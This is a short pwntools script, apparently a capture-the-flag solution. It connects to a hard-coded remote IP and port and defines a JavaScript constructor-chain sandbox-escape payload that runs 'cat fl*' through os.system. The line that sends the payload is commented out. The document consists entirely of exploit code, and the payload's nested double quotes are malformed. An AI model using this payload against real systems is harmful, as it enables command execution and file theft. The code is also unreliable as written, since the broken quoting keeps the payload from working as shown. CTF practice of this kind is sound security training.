from pwn import *
a,b = "111.200.241.244",56021
py = '({}).constructor.constructor(" return os.system("cat fl*")")()'
p = remote(a,b)
#p.sendline(py)
p.interactive()
